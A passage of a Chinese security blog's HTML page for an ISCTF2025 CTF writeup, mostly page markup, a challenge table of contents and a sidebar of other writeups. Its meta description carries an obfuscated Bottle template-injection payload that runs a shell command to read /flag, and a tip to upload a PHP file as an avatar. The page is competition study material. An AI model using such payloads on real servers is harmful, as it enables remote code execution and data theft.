<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>ISCTF2025-Writeup | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="WEB难过的bottlebottle框架的template SSTI &#123;&#123; __ｉｍｐｏｒｔ__(&#39;\157\163&#39;).ｐｏｐｅｎ(&#39;\143\141\164\040\057\146\154\141\147&#39;).ｒｅａｄ() &#125;&#125;    b@by n0t1ce b0ard 注册头像传个php即可 路径是&#x2F;image">
<meta property="og:type" content="article">
<meta property="og:title" content="ISCTF2025-Writeup">
<meta property="og:url" content="http://ta0.fun/posts/23ac0af4/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="WEB难过的bottlebottle框架的template SSTI &#123;&#123; __ｉｍｐｏｒｔ__(&#39;\157\163&#39;).ｐｏｐｅｎ(&#39;\143\141\164\040\057\146\154\141\147&#39;).ｒｅａｄ() &#125;&#125;    b@by n0t1ce b0ard 注册头像传个php即可 路径是&#x2F;image">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201093815.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201093836.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201093607.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201093900.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201103952.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201225359.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201225433.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201225636.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251202180959.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251203105009.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204114244.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204113956.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204114106.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251205195326.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206201909.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206205627.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206205745.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206205756.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251203145813.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251203151116.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251203151208.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204134853.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204134924.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204210419.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204210431.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206105035.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206105104.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206105416.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206214550.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251207095216.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251207095221.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251207101256.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204130429.png">
<meta property="article:published_time" content="2025-12-14T13:34:13.781Z">
<meta property="article:modified_time" content="2025-12-15T03:27:39.843Z">
<meta property="article:author" content="ta0">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201093815.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container sidebar-open"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">157</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">221</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><!-- 友链按钮并排放在社交区--><a class="links-of-author-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><!-- 黑暗模式按钮也并排--><a class="links-of-author-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%BE%E8%BF%87%E7%9A%84bottle"><span class="toc-number">1.1.</span> <span class="toc-text">难过的bottle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b-by-n0t1ce-b0ard"><span class="toc-number">1.2.</span> <span class="toc-text">b@by n0t1ce b0ard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whoami"><span class="toc-number">1.3.</span> <span class="toc-text">whoami</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E5%88%B0%E5%BA%95%E5%9C%A8%E5%93%AA"><span class="toc-number">1.4.</span> <span class="toc-text">flag到底在哪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">1.5.</span> <span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezrce"><span class="toc-number">1.6.</span> <span class="toc-text">ezrce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A5%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7"><span class="toc-number">1.7.</span> <span class="toc-text">来签个到吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mv-upload"><span class="toc-number">1.8.</span> <span class="toc-text">mv_upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%EF%BC%9F%E6%88%91%E5%B0%B1%E5%80%9F%E8%B5%B0%E4%BA%86"><span class="toc-number">1.9.</span> <span class="toc-text">flag？我就借走了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Regretful-Deser"><span class="toc-number">1.10.</span> <span class="toc-text">Regretful_Deser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpop"><span class="toc-number">1.11.</span> <span class="toc-text">ezpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-upload"><span class="toc-number">1.12.</span> <span class="toc-text">include_upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E7%94%9F%E5%BA%8F%E5%88%97"><span class="toc-number">1.13.</span> <span class="toc-text">双生序列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#load-jvav"><span class="toc-number">1.14.</span> <span class="toc-text">load_jvav</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-RSA"><span class="toc-number">2.1.</span> <span class="toc-text">easy_RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Power-tower"><span class="toc-number">2.2.</span> <span class="toc-text">Power tower</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84LFSR%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.3.</span> <span class="toc-text">小蓝鲨的LFSR系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%89%E8%BF%B7%E6%95%B0%E5%AD%A6%E7%9A%84%E5%B0%8F%E8%93%9D%E9%B2%A8"><span class="toc-number">2.4.</span> <span class="toc-text">沉迷数学的小蓝鲨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%AF%86%E7%A0%81%E7%AE%B1"><span class="toc-number">2.5.</span> <span class="toc-text">小蓝鲨的密码箱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-math"><span class="toc-number">2.6.</span> <span class="toc-text">baby_math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84RSA%E5%AF%86%E6%96%87"><span class="toc-number">2.7.</span> <span class="toc-text">小蓝鲨的RSA密文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-equation"><span class="toc-number">2.8.</span> <span class="toc-text">baby_equation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E8%B4%B9%E9%A9%AC%E8%B0%9C%E9%A2%98"><span class="toc-number">2.9.</span> <span class="toc-text">小蓝鲨的费马谜题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A5%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7-1"><span class="toc-number">3.1.</span> <span class="toc-text">来签个到吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-fmt"><span class="toc-number">3.2.</span> <span class="toc-text">ez_fmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2rop"><span class="toc-number">3.3.</span> <span class="toc-text">ret2rop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2048"><span class="toc-number">3.4.</span> <span class="toc-text">2048</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Image-is-all-you-need"><span class="toc-number">3.5.</span> <span class="toc-text">Image_is_all_you_need</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%8D%83%E5%B1%82FLAG"><span class="toc-number">3.6.</span> <span class="toc-text">小蓝鲨的千层FLAG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6"><span class="toc-number">3.7.</span> <span class="toc-text">小蓝鲨的神秘文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#miscrypto"><span class="toc-number">3.8.</span> <span class="toc-text">miscrypto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E5%A4%B1%E7%9A%84flag"><span class="toc-number">3.9.</span> <span class="toc-text">消失的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%B1%E7%8E%A9%E6%B8%B8%E6%88%8F%E7%9A%84%E5%B0%8F%E8%93%9D%E9%B2%A8"><span class="toc-number">3.10.</span> <span class="toc-text">爱玩游戏的小蓝鲨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">4.</span> <span class="toc-text">应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84shell%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">奇怪的shell文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hacker"><span class="toc-number">4.2.</span> <span class="toc-text">hacker</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SIGNIN"><span class="toc-number">5.</span> <span class="toc-text">SIGNIN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ez-Caesar"><span class="toc-number">5.1.</span> <span class="toc-text">Ez_Caesar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84RC4%E7%B3%BB%E7%BB%9F"><span class="toc-number">5.2.</span> <span class="toc-text">小蓝鲨的RC4系统</span></a></li></ol></li></ol></div></div></div><!-- 侧边栏底部空白区域展示目录--><!-- 分类目录区域，所有分类默认收缩--><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="sidebar-bottom-categories" style="margin-top:0.5rem;padding:1rem 0;"><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CTFWP</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b891edcc/">2023aliyunCTF-Bypassit1</a></li><li class="sidebar-cat-post"><a href="/posts/4b74e7f2/">2023WMCTF ez_java_again_rev</a></li><li class="sidebar-cat-post"><a href="/posts/125ab785/">2023羊城杯Ez_java</a></li><li class="sidebar-cat-post"><a href="/posts/996ba1d8/">2023巅峰极客BabyURL</a></li><li class="sidebar-cat-post"><a href="/posts/c292ee15/">BaseCTF-scxml</a></li><li class="sidebar-cat-post"><a href="/posts/7d623870/">GYCTF2020-Easyphp</a></li><li class="sidebar-cat-post"><a href="/posts/9d1ed1c9/">LitCTF2024个人题解</a></li><li class="sidebar-cat-post"><a href="/posts/bd91e42f/">LitCTF2024未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/91008f23/">VNCTF2025复现</a></li><li class="sidebar-cat-post"><a href="/posts/545cd3ac/">XYCTF个人wp</a></li><li class="sidebar-cat-post"><a href="/posts/7345579c/">XYCTF未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/2f532906/">网鼎杯2020玄武组SSRFMe</a></li><li class="sidebar-cat-post"><a href="/posts/4cfd8fa8/">DownunderCTf复现</a></li><li class="sidebar-cat-post"><a href="/posts/43176253/">国城杯web复现</a></li><li class="sidebar-cat-post"><a href="/posts/4666d2e/">帕鲁杯my love复现</a></li><li class="sidebar-cat-post"><a href="/posts/92fba657/">某不知名CTF比赛</a></li><li class="sidebar-cat-post"><a href="/posts/fa26c9c2/">DASCTF2025下半年赛-Writeup</a></li><li class="sidebar-cat-post"><a href="/posts/57b83d00/">nexhuntCTF-Writeup</a></li><li class="sidebar-cat-post"><a href="/posts/17991232/">HeroCTF2025</a></li><li class="sidebar-cat-post"><a href="/posts/d34a19fb/">老乡鸡CTF-Writeup</a></li><li class="sidebar-cat-post"><a href="/posts/23ac0af4/">ISCTF2025-Writeup</a></li><li class="sidebar-cat-post"><a href="/posts/7ca5dbd/">NiteCTF2025-Writeup</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">AD</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/2d21762d/">Kerberos协议</a></li><li class="sidebar-cat-post"><a href="/posts/b774aeb/">NTLM协议</a></li><li class="sidebar-cat-post"><a href="/posts/3e4e3078/">LDAP协议</a></li><li class="sidebar-cat-post"><a href="/posts/636860d3/">AD攻击</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">应急取证</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/22f8a4f5/">2024网鼎杯半决赛安全运营挑战赛</a></li><li class="sidebar-cat-post"><a href="/posts/cc783675/">第一章-应急响应-Linux日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/c8f379ac/">第二章-应急响应-apache日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/9c3ca66c/">webshell查杀</a></li><li class="sidebar-cat-post"><a href="/posts/e0ad1852/">应急响应靶场(1)</a></li><li class="sidebar-cat-post"><a href="/posts/a04aefa7/">应急加固-医院脱库应急处理</a></li><li class="sidebar-cat-post"><a href="/posts/efc85f7f/">应急靶场-Linux入侵排查</a></li><li class="sidebar-cat-post"><a href="/posts/4844d267/">应急靶场-redis应急</a></li><li class="sidebar-cat-post"><a href="/posts/42c3bb70/">日志分析-IIS日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/beb16a0d/">应急靶场-mysql应急</a></li><li class="sidebar-cat-post"><a href="/posts/28af606d/">第二届帕鲁杯应急响应wp</a></li><li class="sidebar-cat-post"><a href="/posts/f79382a3/">第一届&quot;帕鲁杯&quot;wp</a></li><li class="sidebar-cat-post"><a href="/posts/83be2f6e/">第九章-blueteam 的小心思</a></li><li class="sidebar-cat-post"><a href="/posts/bd7d5e3d/">第二届长城杯&amp;CISCN半决赛-应急响应</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">cyberstrikelab</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/3c15bfe8/">ATT&amp;CK实战框架-lab9</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">流量分析</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/864938c/">CobaltStrike流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/a70a62d9/">CobaltStrike4.0流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/ae37354d/">哥斯拉ekp版本流量分析</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">WEB安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/5b4d21b4/">DOM Clobbering</a></li><li class="sidebar-cat-post"><a href="/posts/1bb25fe1/">JAVA常见内存马</a></li><li class="sidebar-cat-post"><a href="/posts/31287ede/">Langflow权限提升漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/7705fe97/">JDK17下的CC链分析</a></li><li class="sidebar-cat-post"><a href="/posts/b88a52de/">Spring jdk17原生链</a></li><li class="sidebar-cat-post"><a href="/posts/f02bb322/">用友U8 Cloud IPFxxFileService 文件上传限制不当漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/57292570/">用友U8 Cloud FileManageServlet/LoginVideoServlet反序列化</a></li><li class="sidebar-cat-post"><a href="/posts/323bf891/">用友U8 Cloud NCCloudGatewayServlet接口 命令执行漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM-Labs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/45ea257e/">lab-Temperance</a></li><li class="sidebar-cat-post"><a href="/posts/13a562a7/">HackMyVM-Hades</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a88f73eb/">HackMyVM-Airbind</a></li><li class="sidebar-cat-post"><a href="/posts/b1859e86/">HackMyVM-BaseME</a></li><li class="sidebar-cat-post"><a href="/posts/724f9cb4/">HackMyVM-Apaches</a></li><li class="sidebar-cat-post"><a href="/posts/2e3aa93f/">HackMyVM-Canto</a></li><li class="sidebar-cat-post"><a href="/posts/16d10af0/">HackMyVM-Casino</a></li><li class="sidebar-cat-post"><a href="/posts/65d8e1a1/">HackMyVM-Birthday</a></li><li class="sidebar-cat-post"><a href="/posts/3e3f7c7d/">HackMyVM-CodeShield</a></li><li class="sidebar-cat-post"><a href="/posts/151f8aa9/">HackMyVM-Comet</a></li><li class="sidebar-cat-post"><a href="/posts/61f88fc9/">HackMyVM-Convert</a></li><li class="sidebar-cat-post"><a href="/posts/9c57f07c/">HackMyVM-DC02</a></li><li class="sidebar-cat-post"><a href="/posts/201f4a94/">HackMyVM-Friendly</a></li><li class="sidebar-cat-post"><a href="/posts/55ea1c6/">HackMyVM-DC01</a></li><li class="sidebar-cat-post"><a href="/posts/b99628b9/">HackMyVM-Dentacare</a></li><li class="sidebar-cat-post"><a href="/posts/13e2841d/">HackMyVM-Inkplot</a></li><li class="sidebar-cat-post"><a href="/posts/65c2fc62/">HackMyVM-Lookup</a></li><li class="sidebar-cat-post"><a href="/posts/3d6a4d0/">HackMyVM-Logan</a></li><li class="sidebar-cat-post"><a href="/posts/b9453620/">HackMyVM-Liar</a></li><li class="sidebar-cat-post"><a href="/posts/4dfb16e2/">HackMyVM-Echoed</a></li><li class="sidebar-cat-post"><a href="/posts/a8d85fe0/">HackMyVM-Nightfall</a></li><li class="sidebar-cat-post"><a href="/posts/dee12de6/">HackMyVM-NightCity</a></li><li class="sidebar-cat-post"><a href="/posts/85f65919/">HackMyVM-Principle</a></li><li class="sidebar-cat-post"><a href="/posts/ed97f61a/">HackMyVM-Friendly2</a></li><li class="sidebar-cat-post"><a href="/posts/1c8b7cf7/">HackMyVM-Puiblishe</a></li><li class="sidebar-cat-post"><a href="/posts/709c1b3d/">HackMyVM-Hell</a></li><li class="sidebar-cat-post"><a href="/posts/8349b408/">HackMyVM-Satori</a></li><li class="sidebar-cat-post"><a href="/posts/54a57065/">HackMyVM-Simple</a></li><li class="sidebar-cat-post"><a href="/posts/b9be1174/">HackMyVM-Observer</a></li><li class="sidebar-cat-post"><a href="/posts/601a25e4/">HackMyVM-Stars</a></li><li class="sidebar-cat-post"><a href="/posts/75345549/">HackMyVM-DC04</a></li><li class="sidebar-cat-post"><a href="/posts/1cc64d1/">HackMyVM-bounty</a></li><li class="sidebar-cat-post"><a href="/posts/3ca28c17/">HackMyVM-Tiny</a></li><li class="sidebar-cat-post"><a href="/posts/6c34648c/">HackMyVM-Za_1</a></li><li class="sidebar-cat-post"><a href="/posts/637ff6f0/">HackMyVM-TriplAdvisor</a></li><li class="sidebar-cat-post"><a href="/posts/e117db9f/">HackMyVM-University</a></li><li class="sidebar-cat-post"><a href="/posts/a4e579f8/">HackMyVM-crack</a></li><li class="sidebar-cat-post"><a href="/posts/7387f134/">HackMyVM-Aurora</a></li><li class="sidebar-cat-post"><a href="/posts/a583b130/">HackMyVM-dejavu</a></li><li class="sidebar-cat-post"><a href="/posts/50cc8bce/">HackMyVM-colors</a></li><li class="sidebar-cat-post"><a href="/posts/99a1cbb9/">HackMyVM-Chronos</a></li><li class="sidebar-cat-post"><a href="/posts/eb50c0ea/">HackMyVM-DC03</a></li><li class="sidebar-cat-post"><a href="/posts/48bf01e2/">HackMyVM-djinn</a></li><li class="sidebar-cat-post"><a href="/posts/6b328076/">HackMyVM-eyes</a></li><li class="sidebar-cat-post"><a href="/posts/f5427d41/">HackMyVM-hundred</a></li><li class="sidebar-cat-post"><a href="/posts/1861442f/">HackMyVM-friendly3</a></li><li class="sidebar-cat-post"><a href="/posts/3d50af75/">HackMyVM-Leet</a></li><li class="sidebar-cat-post"><a href="/posts/8a0eae7/">HackMyVM-oliva</a></li><li class="sidebar-cat-post"><a href="/posts/794033c8/">HackMyVM-tranquil</a></li><li class="sidebar-cat-post"><a href="/posts/42ff075e/">HackMyVM-Literal</a></li><li class="sidebar-cat-post"><a href="/posts/3e9b59e6/">HackMyVM-Kitty</a></li><li class="sidebar-cat-post"><a href="/posts/5e0f535b/">HackMyVM-Printer</a></li><li class="sidebar-cat-post"><a href="/posts/2c430ca5/">HackMyVM-troya</a></li><li class="sidebar-cat-post"><a href="/posts/28f0aa43/">HackMyVM-thwall</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">MAZESEC</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/d2450660/">MazeSec-ta0</a></li><li class="sidebar-cat-post"><a href="/posts/b298e578/">MazeSec-Bicker</a></li><li class="sidebar-cat-post"><a href="/posts/2fc2226d/">MAZESEC-chain</a></li><li class="sidebar-cat-post"><a href="/posts/75928fc0/">MAZESEC-Delete</a></li><li class="sidebar-cat-post"><a href="/posts/10540780/">MAZESEC-Ronos</a></li><li class="sidebar-cat-post"><a href="/posts/78989591/">MazeSec-motto</a></li><li 